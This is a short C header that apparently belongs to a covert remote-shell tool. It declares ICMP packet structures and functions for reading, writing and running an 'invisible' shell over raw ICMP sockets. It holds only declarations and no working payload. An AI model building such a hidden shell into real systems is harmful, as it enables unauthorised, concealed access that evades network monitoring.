#ifndef INVISIBLE_SHELL_H
#define INVISIBLE_SHELL_H


#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>


#include <arpa/inet.h>

#include <linux/ip.h>
#include <linux/icmp.h>
#include "shell.h"

#define BUF_SIZE 1024

int (*net_read)  (int fd, void *buf, size_t count);
int (*net_write) (int fd, void *buf, size_t count);

struct sockaddr_in dest;

typedef struct
{
  struct iphdr   ip;
  struct icmphdr icmp;
  int            len;
  char           data[BUF_SIZE]; /* Data */
} PKT;

typedef struct {
  struct icmphdr icmp;
  int    len;
} PKT_TX;


void async_read_invisible (int s, int s1);
int raw_init (char *ip, int proto);
int net_read_icmp (int s, void *buf, size_t count);
int net_write_icmp (int s, void *buf, size_t count);
void invisible_shell (int s);

#endif
